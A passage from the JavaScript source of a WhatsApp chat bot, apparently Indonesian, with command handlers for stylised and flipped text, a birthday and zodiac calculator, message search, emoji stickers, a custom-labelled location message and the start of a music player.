‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎${command} Hai beb/an`)
var kls = body.slice(9)
var has = kls.split("/")[0];
var kas = kls.split("/")[1];
client.sendMessage(from, `${has}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎${kas}` , text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break	
case 'styletext':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply('Enter The Text')
async function stylizeText(text) {
let res = await fetch('http://qaz.wtf/u/convert.cgi?text=' + encodeURIComponent(text))
let html = await res.text()
let dom = new JSDOM(html)
let table = dom.window.document.querySelector('table').children[0].children
let obj = {}
for (let tr of table) {
let name = tr.querySelector('.aname').innerHTML
let content = tr.children[1].textContent.replace(/^\n/, '').replace(/\n$/, '')
obj[name + (obj[name] ? ' Reversed' : '')] = content
}
return obj
}
matext = args.join(" ")
let fetch = require('node-fetch')
let { JSDOM } = require('jsdom')
reply(Object.entries(await stylizeText(matext)).map(([name, value]) => `${name}\n${value}\n`).join`\n`)
await confirmLIMIT(sender, [angka]) 
break
case 'hbd': 
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
let textus = args.join(" ")
if (!q) return reply(`Example:\n 2002 02 25`)
const zodiak = [
["Capricorn", new Date(1970, 0, 1)],
["Aquarius", new Date(1970, 0, 20)],
["Pisces", new Date(1970, 1, 19)],
["Aries", new Date(1970, 2, 21)],
["Taurus", new Date(1970, 3, 21)],
["Gemini", new Date(1970, 4, 21)],
["Cancer", new Date(1970, 5, 22)],
["Leo", new Date(1970, 6, 23)],
["Virgo", new Date(1970, 7, 23)],
["Libra", new Date(1970, 8, 23)],
["Scorpio", new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
const date = new Date(textus)
if (date == 'Invalid Date') throw date
const d = new Date()
const [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
const birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

const zodiac = getZodiac(birth[1], birth[2])
const ageD = new Date(d - date)
const age = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

const birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
const cekusia = bulan === birth[1] && tanggal === birth[2] ? `Happy -${age}th Birthday 🥳🎉` : age

const teksh = `
Birth : ${birth.join('-')}
Upcoming hbd : ${birthday.join('-')}
Age : ${cekusia}
Zodiak : ${zodiac}
`.trim()
reply(teksh)
await confirmLIMIT(sender, [angka]) 
break 
case 'searchtext':
if (args.length < 1) return reply(`${a}Wrong Format${a} What Message Are You Looking For Bro??\Example : ${prefix}searchtext halo|10`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return reply('minimum 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await client.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return reply('Message Not Found') 
if (cok.messages.length < parseInt(batas)) reply(`Found Only ${cok.messages.length - 1} Messages`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
client.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return reply(`${a}ERROR${a} An error occurred while searching for Messages`)
}
} else {
reply(`Wrong format, this is an example of the correct format : ${prefix}searchtext halo|15`)
}
await confirmLIMIT(sender, [angka]) 
break
case 'fliptext':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
if (args.length < 1) return reply(`Example:\n${prefix}fliptext`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
await confirmLIMIT(sender, [angka]) 
break
case 'tohuruf':
if (!Number(args[0])) return reply(`Example:\n${prefix}tohuruf 456`)
try {
quere = args.join(" ")
convertes = await toHur(quere)
reply(`\`\`\`「 ALPHABET 」\`\`\`\n*•> Number :*\n${quere}\n*•> Alphabet :*\n${convertes}`)
} catch {
replysticker(errorstc)
}
break
case 'emoji':
					case 'semoji':
			if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
					if (!q) return reply('emojinya?')
					qes = args.join(' ')
					emoji.get(`${qes}`).then(emoji => {
					teks = `${emoji.images[4].url}`
		    		sendStickerFromUrl(from,`${teks}`).catch(() =>replysticker(errorstc))	
		    		console.log(teks)          
		   			})
					await confirmLIMIT(sender, [angka]) 
		    		break
case 'fakeloc':
			 if (isBanned) return replysticker(banstc)
				if (!isRegistered) return sendButtonNotRegis(from)
               var kntl = body.slice(8)
			   var nama = kntl.split("|")[0];
			   var impostor = kntl.split("|")[1];
			   var bro = WMthumb
               client.sendMessage(from, { name: `${nama}`,address: `${impostor}`,jpegThumbnail: bro }, MessageType.location)     
		    break

			
/*++++++++++++++++++++++++++
+++++++++MENU BARU++++++++
+++++++++++++++++++++++++++*/           
             
	case 'play':
if (!isRegistered) return sendButtonNotRegis(from)
if (isBanned) return replysticker(banstc)
					if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
		            var srch = args.join('')
		    		aramas = await yts(srch);
		    		aramat = aramas.all 
		   			var mulaikah = aramat[0].url							
		                  try {
		                    yta(mulaikah)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
